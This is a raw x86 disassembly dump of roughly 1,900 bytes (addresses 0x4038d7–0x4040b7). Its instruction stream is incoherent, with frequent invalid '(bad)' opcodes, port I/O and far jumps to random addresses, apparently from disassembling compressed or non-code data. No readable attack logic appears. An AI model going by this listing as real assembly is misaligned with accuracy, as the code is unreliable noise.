  4038d7:	mov    ah,0xd5
  4038d9:	es dec ebp
  4038db:	test   al,0xe1
  4038dd:	xchg   BYTE PTR [edx],dh
  4038df:	(bad)  
  4038e0:	test   al,0x79
  4038e2:	pop    esi
  4038e3:	ds push edi
  4038e5:	out    dx,al
  4038e6:	or     bl,BYTE PTR [edi]
  4038e8:	daa    
  4038e9:	test   BYTE PTR [edx+0x7a934f5e],dh
  4038ef:	ret    
  4038f0:	pop    DWORD PTR [ecx]
  4038f2:	xor    eax,0x86a872dc
  4038f7:	sub    edi,DWORD PTR [edx]
  4038f9:	lods   eax,DWORD PTR ds:[esi]
  4038fa:	test   DWORD PTR [ecx+edx*2],esi
  4038fd:	mov    ah,0x9d
  4038ff:	push   edx
  403900:	fwait
  403901:	inc    esp
  403902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403903:	loopne 0x40388d
  403905:	xor    DWORD PTR [ebx+ebx*2+0xd139801],esp
  40390c:	sbb    eax,0x16e322c4
  403911:	mov    ah,0xd9
  403913:	cmp    eax,0x369ecf97
  403918:	ins    BYTE PTR es:[edi],dx
  403919:	adc    al,0xab
  40391b:	cmp    eax,0x9d240cf3
  403920:	jns    0x4038c7
  403922:	push   ebp
  403923:	jmp    0x403945
  403925:	dec    esi
  403926:	jp     0x403913
  403928:	pop    DWORD PTR [edi]
  40392a:	dec    ebx
  40392b:	jle    0x403995
  40392d:	out    0x64,eax
  40392f:	outs   dx,DWORD PTR ds:[esi]
  403930:	mov    ch,0xbd
  403932:	retf   
  403933:	xchg   esi,eax
  403934:	ins    BYTE PTR es:[edi],dx
  403935:	mov    ah,0x8b
  403937:	jae    0x403958
  403939:	int3   
  40393a:	sub    edx,DWORD PTR [ebx]
  40393c:	push   eax
  40393d:	xor    BYTE PTR [edi],0x43
  403940:	les    ebx,FWORD PTR [edi]
  403942:	adc    al,0x7d
  403944:	lahf   
  403945:	add    eax,DWORD PTR [eax-0x57428f25]
  40394b:	data16 jns 0x4038d8
  40394e:	mov    eax,ds:0x4e0f74b5
  403953:	and    al,0xd3
  403955:	and    DWORD PTR [edx+0x55],0xffffff9f
  403959:	cli    
  40395a:	mov    bl,0xb4
  40395c:	inc    ebp
  40395d:	test   DWORD PTR [ebp-0x170a3aef],ecx
  403963:	xchg   BYTE PTR [edi],ah
  403965:	push   eax
  403966:	imul   edi,DWORD PTR [ebp-0x267e670a],0x6f
  40396d:	pop    eax
  40396e:	mov    bl,0x85
  403970:	cmp    ebx,DWORD PTR [ebx-0x7591ef1b]
  403976:	cmp    BYTE PTR [edi+edx*1-0x38],dh
  40397a:	dec    esp
  40397b:	stos   DWORD PTR es:[edi],eax
  40397c:	adc    esp,edx
  40397e:	in     al,0xc4
  403980:	cmp    al,0xf3
  403982:	rcl    BYTE PTR [ecx-0x53],cl
  403985:	jmp    0x639ec2a3
  40398a:	dec    eax
  40398b:	mov    cl,0x6e
  40398d:	pop    ebx
  40398e:	xchg   edx,eax
  40398f:	pushf  
  403990:	hlt    
  403991:	dec    ecx
  403992:	fdivr  st(6),st
  403994:	cmp    ebp,ecx
  403996:	dec    DWORD PTR [ecx]
  403998:	test   edi,esi
  40399a:	cs sti 
  40399c:	adc    eax,0xcc1619f2
  4039a1:	repz mov al,ds:0x69a59e8c
  4039a7:	mov    esi,ecx
  4039a9:	jb     0x40397a
  4039ab:	jnp    0x40394d
  4039ad:	xchg   ecx,eax
  4039af:	adc    al,0x55
  4039b1:	cdq    
  4039b2:	outs   dx,DWORD PTR ds:[esi]
  4039b3:	mov    ebp,0x18d732d4
  4039b8:	inc    eax
  4039b9:	cdq    
  4039ba:	ins    BYTE PTR es:[edi],dx
  4039bb:	xchg   esi,eax
  4039bc:	push   ds
  4039bd:	dec    edx
  4039be:	test   al,0xb8
  4039c0:	(bad)  
  4039c1:	lock fcomi st,st(6)
  4039c4:	add    BYTE PTR [ebx+0x22],dh
  4039c7:	fwait
  4039c8:	jmp    0xd9f305bd
  4039cd:	pusha  
  4039ce:	sbb    esp,eax
  4039d0:	push   esp
  4039d1:	imul   edx,DWORD PTR [ecx-0x7f6eddc6],0xe5fbb272
  4039db:	adc    BYTE PTR [ebp+ecx*2+0x2eca470f],al
  4039e2:	cmp    DWORD PTR [ebp-0x5b],esi
  4039e5:	and    ecx,esi
  4039e7:	call   0xba25c1f4
  4039ec:	pop    ebx
  4039ed:	add    eax,0x114c0ea
  4039f2:	sti    
  4039f3:	not    DWORD PTR [esi]
  4039f5:	lods   al,BYTE PTR ds:[esi]
  4039f6:	sbb    DWORD PTR [ebp+0x34],esi
  4039f9:	pushf  
  4039fa:	imul   edx,DWORD PTR [edx-0x3e],0x63
  4039fe:	jmp    FWORD PTR [eax+0x15]
  403a01:	sbb    eax,0x9787d7ae
  403a06:	in     eax,0x3d
  403a08:	mov    ds:0x2e86a10c,eax
  403a0d:	mov    edx,0x2b8ef6d8
  403a12:	in     eax,0xab
  403a14:	sbb    ch,BYTE PTR [edi]
  403a16:	and    DWORD PTR [eax-0x2e927983],edi
  403a1c:	fidivr DWORD PTR [esi-0x4ce7b087]
  403a22:	jle    0x4039a5
  403a24:	sub    ebx,DWORD PTR [eax]
  403a26:	sub    bh,0xfd
  403a29:	pop    edx
  403a2a:	xor    ch,ch
  403a2c:	jb     0x403a41
  403a2e:	repz xchg ebp,eax
  403a30:	adc    al,0xfd
  403a32:	inc    edx
  403a33:	xor    al,0xea
  403a35:	hlt    
  403a36:	jmp    0xa02f:0xcb152b1b
  403a3d:	mov    BYTE PTR [ecx],bl
  403a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a40:	and    eax,0x768341a5
  403a45:	test   al,0x60
  403a47:	xchg   esi,eax
  403a48:	inc    esp
  403a49:	cmp    al,0x8e
  403a4b:	sub    edx,ebp
  403a4d:	ror    BYTE PTR [ebx-0x65],cl
  403a50:	push   ds
  403a51:	xacquire xchg DWORD PTR [edi],edx
  403a54:	dec    eax
  403a56:	(bad)  
  403a57:	out    0xd6,al
  403a59:	xor    ch,BYTE PTR [edi-0x50]
  403a5c:	call   0xd7f972ac
  403a61:	pop    ebp
  403a62:	mov    ds:0x10e339e9,al
  403a67:	xor    ebx,DWORD PTR [esi]
  403a69:	sbb    DWORD PTR [edx-0x39],ecx
  403a6c:	shr    bl,cl
  403a6e:	btc    ebp,eax
  403a71:	aam    0xc6
  403a73:	and    al,bh
  403a75:	push   ebx
  403a76:	mov    ecx,0x317f0310
  403a7b:	sbb    eax,0xa41bcc41
  403a80:	xor    al,0x11
  403a82:	inc    ecx
  403a83:	hlt    
  403a84:	adc    esi,eax
  403a86:	loopne 0x403aaf
  403a88:	xchg   edx,eax
  403a89:	dec    esi
  403a8a:	in     eax,dx
  403a8b:	shl    BYTE PTR [ecx-0x2e],0x75
  403a8f:	mov    al,ds:0xad7ca0d1
  403a94:	and    BYTE PTR [eax-0x13],al
  403a97:	out    0x8e,al
  403a99:	(bad)  
  403a9a:	xor    eax,0x8db35634
  403a9f:	out    0x5f,al
  403aa1:	jle    0x403ae5
  403aa3:	jb     0x403b23
  403aa5:	mov    esi,0xcfae509f
  403aaa:	hlt    
  403aab:	stc    
  403aac:	sub    al,0x88
  403aae:	cmc    
  403aaf:	jge    0x403ae2
  403ab1:	stos   BYTE PTR es:[edi],al
  403ab2:	popf   
  403ab3:	inc    edx
  403ab4:	mov    ecx,0x3dec3da8
  403ab9:	adc    al,0xf2
  403abb:	enter  0xa8fb,0xaa
  403abf:	in     eax,0x97
  403ac1:	jecxz  0x403b3e
  403ac3:	push   es
  403ac4:	imul   BYTE PTR [eax]
  403ac6:	pop    esp
  403ac7:	loopne 0x403a53
  403ac9:	push   ds
  403aca:	je     0x403ac5
  403acc:	sbb    eax,0xc61b50b9
  403ad1:	(bad)  
  403ad3:	xor    eax,0xb73c9373
  403ad8:	loop   0x403aad
  403ada:	mov    ds,WORD PTR [ebp-0x744ce25d]
  403ae0:	test   eax,0xe5a8d
  403ae5:	mov    al,0x2a
  403ae7:	dec    ebx
  403ae8:	lea    eax,[ebx]
  403aea:	out    dx,al
  403aeb:	inc    eax
  403aec:	jns    0x403b31
  403aee:	sub    ebx,DWORD PTR [ecx+0x205ba1c7]
  403af4:	test   al,0xee
  403af6:	int    0x47
  403af8:	aaa    
  403af9:	inc    DWORD PTR [ebx+ecx*4-0x4a536266]
  403b00:	dec    esp
  403b01:	mov    DWORD PTR [ebx],eax
  403b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b04:	mov    ecx,0x2cee157d
  403b09:	jg     0x403b84
  403b0b:	out    0x59,al
  403b0d:	es xchg edi,eax
  403b0f:	sbb    dh,BYTE PTR [edx+ebx*1-0x618a1ac2]
  403b16:	xlat   BYTE PTR ds:[ebx]
  403b17:	jmp    0x168:0x2d786876
  403b1e:	pop    ecx
  403b1f:	cmp    eax,0x56a74c11
  403b24:	fisub  DWORD PTR [esi+edi*1-0x6eb1a87a]
  403b2b:	rcl    ch,1
  403b2d:	jmp    DWORD PTR [eax+0x78]
  403b30:	adc    eax,0xd79104e9
  403b35:	push   edi
  403b36:	repz fs mov dh,0xf5
  403b3a:	or     DWORD PTR [esi-0x2de74396],ecx
  403b40:	inc    esp
  403b41:	mov    edx,0x903b4d4e
  403b46:	hlt    
  403b47:	mov    eax,0xadb76cb3
  403b4c:	fwait
  403b4d:	in     al,0x8e
  403b4f:	aam    0x87
  403b51:	fistp  DWORD PTR [eax-0x669dc97e]
  403b57:	sbb    ah,bh
  403b59:	cdq    
  403b5a:	add    edx,DWORD PTR [ebx]
  403b5c:	mov    ds:0xc3b7ac8b,al
  403b61:	std    
  403b62:	or     al,ch
  403b64:	pop    ss
  403b65:	loope  0x403b30
  403b67:	sbb    al,ah
  403b69:	fsubr  QWORD PTR ds:0xed00140d
  403b6f:	xchg   edi,eax
  403b70:	arpl   WORD PTR [edx+0x74],ax
  403b73:	or     cl,BYTE PTR [eax+0x4ddcddad]
  403b79:	sbb    al,0x3b
  403b7b:	sub    al,0xff
  403b7d:	imul   esp,DWORD PTR [edi+0x7d4e16f1],0xffffffb0
  403b84:	jns    0x403c00
  403b86:	cmp    BYTE PTR [esi+0x6c26594c],0x47
  403b8d:	xor    eax,DWORD PTR [ebx+ecx*2+0x3c]
  403b91:	ja     0x403b17
  403b93:	imul   edi,esp,0xcd801f3d
  403b99:	cs jp  0x403ba2
  403b9c:	mov    ?,WORD PTR [eax-0x16f72d2c]
  403ba2:	push   ebp
  403ba3:	fisubr DWORD PTR [eax]
  403ba5:	stc    
  403ba6:	mov    esi,0x8b73e9da
  403bab:	pop    ebx
  403bac:	out    0x13,al
  403bae:	iret   
  403baf:	pop    ds
  403bb0:	ja     0x403b61
  403bb2:	call   0xc197:0xea1a6b08
  403bb9:	or     DWORD PTR [ecx],ebp
  403bbb:	pop    esi
  403bbc:	(bad)  
  403bbd:	leave  
  403bbe:	push   0x4a919f52
  403bc3:	mov    ebx,0x8be26299
  403bc8:	or     eax,0x2ae45f3c
  403bcd:	ret    
  403bce:	dec    edi
  403bcf:	or     ebx,DWORD PTR [eax]
  403bd1:	push   ds
  403bd2:	fmul   DWORD PTR [esi+0x63]
  403bd5:	pushf  
  403bd6:	pop    edi
  403bd7:	fmul   QWORD PTR [eax]
  403bd9:	adc    DWORD PTR [esi-0x7469ebee],eax
  403bdf:	cli    
  403be0:	loopne 0x403c3b
  403be2:	inc    edi
  403be3:	xchg   ebx,eax
  403be4:	cmp    eax,0x1e77085c
  403be9:	aad    0x87
  403beb:	cmp    DWORD PTR [ebx],esp
  403bed:	fisub  DWORD PTR [edi+ecx*1-0x45]
  403bf1:	mov    ebp,0xe33efea0
  403bf6:	jmp    0x9c20f7c1
  403bfb:	cmp    ecx,DWORD PTR [ebp-0x622ec926]
  403c01:	rcl    BYTE PTR [ebp+0x7f88338b],0xfa
  403c08:	sbb    eax,0x84c3cec7
  403c0d:	inc    esp
  403c0e:	aas    
  403c0f:	xchg   ebp,eax
  403c10:	and    eax,0xad309f3f
  403c15:	inc    eax
  403c16:	push   ecx
  403c17:	ret    
  403c18:	(bad)  
  403c19:	and    DWORD PTR [edx],ecx
  403c1b:	xor    eax,0xb40b07a6
  403c20:	jecxz  0x403bcf
  403c22:	imul   esp,DWORD PTR [ecx],0xf
  403c25:	jecxz  0x403be6
  403c27:	rcl    DWORD PTR [esi+0x4f],1
  403c2a:	int3   
  403c2b:	shr    BYTE PTR [esi+edx*8],1
  403c2e:	adc    al,0x38
  403c30:	mov    ah,0x28
  403c32:	aad    0x24
  403c34:	loope  0x403c23
  403c36:	in     al,0x9
  403c38:	and    BYTE PTR [esi+edx*2],cl
  403c3b:	mov    eax,0xcb57fd75
  403c40:	loopne 0x403c09
  403c42:	pop    esi
  403c43:	xor    DWORD PTR [edx+0x3e],esp
  403c46:	mov    ebx,DWORD PTR [edx+0x37]
  403c49:	out    0xd5,al
  403c4b:	mov    esi,0x382943fa
  403c50:	sti    
  403c51:	scas   al,BYTE PTR es:[edi]
  403c52:	push   0x2bba6dce
  403c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c58:	xchg   DWORD PTR es:[ecx-0x4],ebx
  403c5c:	imul   edi,DWORD PTR [eax+0x8d69e9f],0x807453f
  403c66:	dec    ebx
  403c67:	sub    DWORD PTR [edx+0x4],ecx
  403c6a:	xor    DWORD PTR [ebp-0x45],ebp
  403c6d:	mov    dl,0xf4
  403c6f:	or     al,0x18
  403c71:	icebp  
  403c72:	jmp    0xe109:0x30444dae
  403c79:	jmp    0x403c9a
  403c7b:	jae    0x403c9f
  403c7d:	xlat   BYTE PTR gs:[ebx]
  403c7f:	cdq    
  403c80:	mov    dl,0xf5
  403c82:	add    DWORD PTR [edx-0x65],ecx
  403c85:	lock mov edi,0xb66bb298
  403c8b:	cmp    ebx,DWORD PTR [eax]
  403c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c8e:	adc    al,BYTE PTR ds:0x6dccbb99
  403c94:	push   DWORD PTR [ecx+0x2ab15894]
  403c9a:	dec    ebp
  403c9b:	fcmovne st,st(0)
  403c9d:	(bad)  
  403c9e:	(bad)  
  403c9f:	out    dx,al
  403ca0:	inc    dx
  403ca2:	mov    ds:0x8b2aa7e2,eax
  403ca7:	mov    bl,BYTE PTR [esi]
  403ca9:	sub    DWORD PTR [edx],esp
  403cab:	jg     0x403ced
  403cad:	retf   0x102
  403cb0:	adc    al,0x5c
  403cb2:	stos   DWORD PTR es:[edi],eax
  403cb3:	lock sbb eax,eax
  403cb6:	int3   
  403cb7:	ja     0x403d2e
  403cb9:	imul   BYTE PTR [edi-0xe]
  403cbc:	jnp    0x403c43
  403cbe:	dec    esi
  403cbf:	mov    dh,0x60
  403cc1:	cmp    eax,0xeef55538
  403cc6:	pop    ebx
  403cc7:	std    
  403cc8:	enter  0x8952,0x76
  403ccc:	mov    eax,ds:0x87645940
  403cd1:	or     al,0x47
  403cd3:	call   0xb6f9:0x7b09178a
  403cda:	ins    BYTE PTR es:[edi],dx
  403cdb:	pop    ecx
  403cdc:	ss ret 
  403cde:	xor    ah,BYTE PTR [esi]
  403ce0:	shr    BYTE PTR [ecx+0x4d],cl
  403ce3:	mov    fs,WORD PTR [edi+0x2cf9608e]
  403ce9:	jne    0x403cca
  403ceb:	jnp    0x403d45
  403ced:	sar    DWORD PTR ds:0xdeb962b7,0xfd
  403cf4:	pop    edi
  403cf6:	and    eax,0xa2cfde94
  403cfb:	jl     0x403d09
  403cfd:	push   esp
  403cfe:	mov    edx,0xd42d6c2a
  403d03:	es ins BYTE PTR es:[edi],dx
  403d05:	sub    eax,DWORD PTR [ebp-0x52]
  403d08:	call   0xec44:0x50904daa
  403d0f:	movzx  esi,WORD PTR [eax]
  403d12:	(bad)  ss:[edx+eiz*8]
  403d16:	pop    ss
  403d17:	jmp    0x5361cc1c
  403d1c:	jle    0x403d64
  403d1e:	test   al,0x49
  403d20:	mov    ebp,edi
  403d22:	inc    edx
  403d23:	xor    dh,BYTE PTR [ebp-0x3ea3a8c]
  403d29:	lahf   
  403d2a:	mov    edi,0xf3d43ea0
  403d2f:	pop    edi
  403d30:	xchg   ebp,eax
  403d31:	sub    ebx,ecx
  403d33:	inc    ecx
  403d34:	and    ch,BYTE PTR [esi]
  403d36:	push   ecx
  403d37:	dec    esp
  403d38:	pop    edi
  403d3a:	retf   
  403d3b:	jmp    0x403d2b
  403d3d:	add    eax,ebp
  403d3f:	push   esi
  403d40:	imul   ebp,DWORD PTR [eax-0x66],0xc56f918f
  403d47:	mov    ebp,DWORD PTR [eax+0x33]
  403d4a:	cmc    
  403d4b:	pop    DWORD PTR [ecx+0x7b]
  403d4e:	push   ecx
  403d4f:	fisubr DWORD PTR [edx+eiz*8]
  403d52:	ret    0x9f6
  403d55:	push   ds
  403d56:	stc    
  403d57:	adc    cl,al
  403d59:	repz js 0x403dd1
  403d5c:	loop   0x403d9e
  403d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5f:	jno    0x403cea
  403d61:	hlt    
  403d62:	mul    cl
  403d64:	outs   dx,DWORD PTR ds:[esi]
  403d65:	aad    0x42
  403d67:	sbb    edx,DWORD PTR [eax+0x66]
  403d6a:	stos   DWORD PTR es:[edi],eax
  403d6b:	cmp    ah,0xdf
  403d6e:	add    ch,BYTE PTR [ebp+0x305e826]
  403d74:	shl    DWORD PTR [edx+edi*1-0x1dfa7aec],0xef
  403d7c:	test   al,0xdf
  403d7e:	xchg   BYTE PTR [eax+0x78],dl
  403d81:	std    
  403d82:	sbb    ah,0x4b
  403d85:	push   esp
  403d86:	test   BYTE PTR [ebx*1-0x215c9186],bh
  403d8d:	ja     0x403e0a
  403d8f:	jns    0x403dbc
  403d91:	push   0x2c04f015
  403d96:	retf   0xca0d
  403d99:	sub    bl,BYTE PTR [eax+0x46]
  403d9c:	adc    ebp,DWORD PTR [ecx]
  403d9e:	jno    0x403dff
  403da0:	mov    DWORD PTR [ebx+eiz*1-0x2fc62911],ebx
  403da7:	lds    ebp,FWORD PTR [eax]
  403da9:	int    0x1a
  403dab:	xor    eax,0xb0bff070
  403db0:	cmp    al,0xcf
  403db2:	cwde   
  403db3:	dec    eax
  403db4:	mov    dh,BYTE PTR [edx-0xeffc86d]
  403dba:	xchg   edx,eax
  403dbb:	sbb    dh,bh
  403dbd:	not    DWORD PTR [ecx+0x55]
  403dc0:	sbb    ecx,edi
  403dc2:	cmp    eax,0xc17387c8
  403dc7:	retf   
  403dc8:	lds    esp,FWORD PTR [ebx+ebp*2]
  403dcb:	jnp    0x403d61
  403dcd:	stos   BYTE PTR es:[edi],al
  403dce:	arpl   WORD PTR [edx-0x3e],dx
  403dd1:	xor    ebp,ecx
  403dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd4:	test   eax,0x9096b3e5
  403dd9:	sub    esp,DWORD PTR [eax-0x73]
  403ddc:	pop    es
  403ddd:	fdivrp st(6),st
  403ddf:	jl     0x403dc3
  403de1:	jbe    0x403e41
  403de3:	int3   
  403de4:	adc    bl,BYTE PTR [edx+0xd]
  403de7:	or     eax,0x56535cf9
  403dec:	fdivr  QWORD PTR [ebp*2+0xbe58317]
  403df3:	shr    DWORD PTR [ebx+0x930d104],cl
  403df9:	retf   
  403dfa:	xor    eax,0x939ff69
  403dff:	xchg   esi,eax
  403e00:	jg     0x403e4b
  403e02:	mov    al,0xe3
  403e04:	jmp    0x403e49
  403e06:	dec    ebp
  403e07:	pushf  
  403e08:	inc    ecx
  403e09:	js     0x403d9b
  403e0b:	jno    0x403df9
  403e0d:	jae    0x403dce
  403e0f:	jl     0x403e4b
  403e11:	xor    BYTE PTR [ecx+ebp*8-0x5381fe84],cl
  403e18:	jl     0x403e21
  403e1a:	adc    eax,0x3dde6daf
  403e1f:	xor    ebp,0xc5c54354
  403e25:	rol    BYTE PTR [ebx],1
  403e27:	aaa    
  403e28:	adc    bl,BYTE PTR [eax+0x334767ee]
  403e2e:	fwait
  403e2f:	xchg   ebp,eax
  403e30:	pop    ds
  403e31:	(bad)  
  403e32:	xor    al,0xa7
  403e34:	icebp  
  403e35:	mov    ch,0xe8
  403e37:	mov    esp,0x1d4747fd
  403e3c:	sar    ebx,0xbe
  403e3f:	push   0x92dc7b04
  403e44:	out    0xab,al
  403e46:	outs   dx,BYTE PTR ds:[esi]
  403e47:	mov    bh,0xbc
  403e49:	retf   
  403e4a:	repz data16 xor bh,BYTE PTR [ebx+0x25]
  403e4f:	cmp    BYTE PTR [ebx],0x82
  403e52:	xlat   BYTE PTR ds:[ebx]
  403e53:	pop    edi
  403e54:	jl     0x403e36
  403e56:	test   al,0xd8
  403e58:	sbb    BYTE PTR [esi],bh
  403e5a:	or     BYTE PTR [eax-0x29495fbb],ah
  403e60:	test   al,0xd9
  403e62:	cmp    al,ch
  403e64:	retf   
  403e65:	daa    
  403e66:	cmp    esp,esp
  403e68:	rcl    DWORD PTR [ebx+0x32fd03c9],cl
  403e6e:	sub    al,0x73
  403e70:	lahf   
  403e71:	sbb    dl,BYTE PTR [ebp-0xf]
  403e74:	int    0x3f
  403e76:	shl    ebx,1
  403e78:	push   edi
  403e79:	mov    edi,0xd6176c74
  403e7e:	mov    ebx,0xc8cc94e9
  403e83:	or     al,0x72
  403e85:	loop   0x403ee0
  403e87:	das    
  403e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e89:	fmul   DWORD PTR cs:[ecx-0x1c]
  403e8d:	pop    ebx
  403e8e:	ficomp WORD PTR [eax]
  403e90:	pop    ebp
  403e91:	jecxz  0x403e8d
  403e93:	add    eax,0xe84a580a
  403e98:	pop    ss
  403e99:	in     eax,dx
  403e9a:	gs (bad) 
  403e9c:	cmc    
  403e9d:	retf   0x497
  403ea0:	xor    eax,0x2cbea4c8
  403ea5:	pop    es
  403ea6:	pop    eax
  403ea7:	(bad)  
  403ea8:	sub    al,0xd2
  403eaa:	sub    DWORD PTR [edx+ebx*4],edx
  403ead:	sbb    esp,ecx
  403eaf:	rcl    ebp,cl
  403eb1:	pop    es
  403eb2:	jno    0x403e64
  403eb4:	xchg   edi,eax
  403eb5:	push   ebx
  403eb6:	adc    eax,0xf9e9f812
  403ebb:	inc    DWORD PTR [ecx-0x3320a4c5]
  403ec1:	xor    dl,bh
  403ec3:	or     DWORD PTR [ecx],0xffffffa0
  403ec6:	shl    DWORD PTR [eax-0x13],0x58
  403eca:	jg     0x403e87
  403ecc:	bound  edi,QWORD PTR [ecx-0x73]
  403ecf:	fwait
  403ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ed2:	mov    al,ds:0x2c80f30c
  403ed7:	push   ecx
  403ed8:	les    esi,FWORD PTR [ebx+0x71]
  403edb:	and    esp,DWORD PTR [esp-0x2b075d2d]
  403ee2:	xchg   ecx,eax
  403ee3:	addr16 pop esi
  403ee5:	sub    bl,dh
  403ee7:	and    ebx,edx
  403ee9:	je     0x403f3c
  403eeb:	xchg   esp,eax
  403eec:	mov    dh,0x45
  403eee:	jp     0x403ed7
  403ef0:	fadd   DWORD PTR [ebp-0x1203aa04]
  403ef6:	inc    edx
  403ef8:	retf   0x3cf4
  403efb:	push   ss
  403efc:	cmp    dh,0x56
  403eff:	fdiv   QWORD PTR [esi+esi*8-0x8]
  403f03:	add    esi,edx
  403f05:	aas    
  403f06:	aaa    
  403f07:	fadd   QWORD PTR [edx+edx*8]
  403f0a:	push   cs
  403f0b:	mov    al,0x60
  403f0d:	push   ecx
  403f0e:	jmp    0xd881:0xb4086af2
  403f15:	lock adc esi,DWORD PTR [ebp+ebx*1-0x3f]
  403f1a:	adc    ch,BYTE PTR ds:0x4a8e5be
  403f20:	jbe    0x403f65
  403f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f23:	sbb    BYTE PTR [ebx-0xadd5b74],ah
  403f29:	pop    ecx
  403f2a:	mov    ebp,0x91b6b8bd
  403f2f:	mov    BYTE PTR ds:[edi+ecx*4+0x58e44ecd],bl
  403f37:	push   cs
  403f38:	test   DWORD PTR [edi-0x1c],edi
  403f3b:	outs   dx,BYTE PTR ds:[esi]
  403f3c:	xor    bl,BYTE PTR [ebp+0x70d5a69e]
  403f42:	repnz push eax
  403f44:	and    DWORD PTR [ebp-0x28],0x57
  403f48:	pop    esp
  403f49:	jae    0x403efd
  403f4b:	mov    eax,ds:0x9174002d
  403f50:	fld    TBYTE PTR [ecx]
  403f52:	fst    QWORD PTR [edi+ebx*8-0x68cd7c0b]
  403f59:	xchg   ch,dh
  403f5b:	ins    DWORD PTR es:[edi],dx
  403f5c:	pop    esp
  403f5d:	jo     0x403f60
  403f5f:	pop    es
  403f60:	add    bh,ch
  403f62:	cmp    BYTE PTR [eax-0x56fc1d14],bl
  403f68:	lds    ecx,FWORD PTR [ebx-0x29]
  403f6b:	retf   
  403f6c:	xor    esp,DWORD PTR [ebp-0x1e]
  403f6f:	loop   0x403f6d
  403f71:	mov    edx,0x7ced3307
  403f76:	imul   eax,DWORD PTR [edx+0x33cf3fab],0xfd2f9e86
  403f80:	ins    DWORD PTR es:[edi],dx
  403f81:	push   es
  403f82:	(bad)  
  403f83:	repnz leavew 
  403f86:	cmp    BYTE PTR [ebx+0x66],0xf1
  403f8a:	(bad)  
  403f8b:	lock pop esp
  403f8d:	ret    0xb98c
  403f90:	dec    edx
  403f91:	pop    esp
  403f92:	sub    DWORD PTR [ebx],0xf4cbb056
  403f98:	sub    ebx,DWORD PTR [ebx+eax*4-0x74]
  403f9c:	sub    BYTE PTR [edi],al
  403f9e:	lods   eax,DWORD PTR ds:[esi]
  403f9f:	cmp    bl,BYTE PTR [eax*2-0x135965ce]
  403fa6:	(bad)  
  403fa8:	xor    esi,DWORD PTR [ecx+0x48]
  403fab:	(bad)
  403faf:	(bad)
  403fb4:	sbb    eax,0x628677e0
  403fb9:	mov    DWORD PTR [esi+0x5f4d4ff9],ebx
  403fbf:	mov    WORD PTR [ecx],es
  403fc1:	add    al,0xb2
  403fc3:	icebp  
  403fc4:	jae    0x404040
  403fc6:	pop    eax
  403fc7:	mov    esp,0x35104ade
  403fcc:	push   ebp
  403fcd:	(bad)  
  403fce:	stos   DWORD PTR es:[edi],eax
  403fcf:	(bad)  
  403fd0:	enter  0x14b0,0x5d
  403fd4:	and    al,0xcd
  403fd6:	ror    DWORD PTR [esi],0x5f
  403fd9:	jge    0x403f9a
  403fdb:	sub    al,0x1f
  403fdd:	mov    WORD PTR [ecx+0x5b1f96bf],gs
  403fe3:	rcl    DWORD PTR [edi],1
  403fe5:	xchg   edx,eax
  403fe6:	sub    BYTE PTR [edx],ch
  403fe8:	inc    edi
  403fe9:	repnz adc BYTE PTR [esi],dl
  403fec:	fstp   QWORD PTR [ebp+ecx*8-0x7f]
  403ff0:	repnz add esp,DWORD PTR [esi]
  403ff3:	add    dh,BYTE PTR [esi+0x43]
  403ff6:	pop    ds
  403ff7:	jmp    0x2314:0x51e03268
  403ffe:	mov    cl,0xee
  404000:	les    ebp,FWORD PTR [ebp-0x53e409f9]
  404006:	lock test eax,0x555fce9b
  40400c:	add    DWORD PTR [eax],ebx
  40400e:	push   esi
  40400f:	mov    esp,0x5c84a74e
  404014:	ffreep st(5)
  404016:	push   0xba1b96d3
  40401b:	xlat   BYTE PTR ds:[ebx]
  40401c:	or     esi,DWORD PTR [edi+0x6a1d65b8]
  404022:	dec    edx
  404023:	push   0xadd37d07
  404028:	pop    ecx
  404029:	sbb    ch,0xcc
  40402c:	sub    edi,DWORD PTR [edx]
  40402e:	cmp    eax,0xe226ff78
  404033:	lahf   
  404034:	mov    ch,0x80
  404036:	pop    ebp
  404037:	lods   eax,DWORD PTR ds:[esi]
  404038:	aaa    
  404039:	mov    al,ds:0x56aebd50
  40403e:	jo     0x404070
  404040:	mov    al,BYTE PTR ds:0xe8d5f492
  404046:	xor    bl,BYTE PTR [ebx-0x7988aafa]
  40404c:	mov    ah,0x38
  40404e:	ret    
  40404f:	mov    esp,0x9092b9a1
  404054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404055:	test   DWORD PTR [ebp+0x8bfce22],ecx
  40405b:	test   BYTE PTR [ecx-0x2d],0x87
  40405f:	out    0x73,eax
  404061:	mov    bl,cl
  404063:	pop    ebx
  404064:	mov    ebp,0x326e1a2e
  404069:	out    dx,al
  40406a:	xor    BYTE PTR [eax-0x5e],dl
  40406d:	ror    BYTE PTR ds:0xce36d0e1,0x8f
  404074:	jo     0x404047
  404076:	and    dl,BYTE PTR [ecx+0xee10968]
  40407c:	or     eax,0x1849dd51
  404081:	or     DWORD PTR [eax],edi
  404083:	inc    eax
  404084:	push   eax
  404085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404086:	adc    eax,esp
  404088:	sbb    ecx,DWORD PTR [ebp-0x682af97c]
  40408e:	bound  edi,QWORD PTR [ebp-0x43]
  404091:	add    DWORD PTR ds:[edi+eax*1+0x45497e23],eax
  404099:	(bad)  
  40409a:	xchg   esp,eax
  40409b:	and    al,0xe
  40409d:	mov    DWORD PTR [edi],edi
  40409f:	add    edi,ebx
  4040a1:	add    BYTE PTR [edx+0x56],bh
  4040a4:	jecxz  0x404078
  4040a6:	shl    BYTE PTR [edx],cl
  4040a8:	add    BYTE PTR [edx],bl
  4040aa:	jnp    0x4040df
  4040ac:	or     esi,DWORD PTR [eax+0x14]
  4040af:	mov    cl,0xb7
  4040b1:	pop    ebp
  4040b2:	test   BYTE PTR [esi],ah
  4040b4:	sbb    BYTE PTR [ebp+0x19],bh
  4040b7:	dec    edx
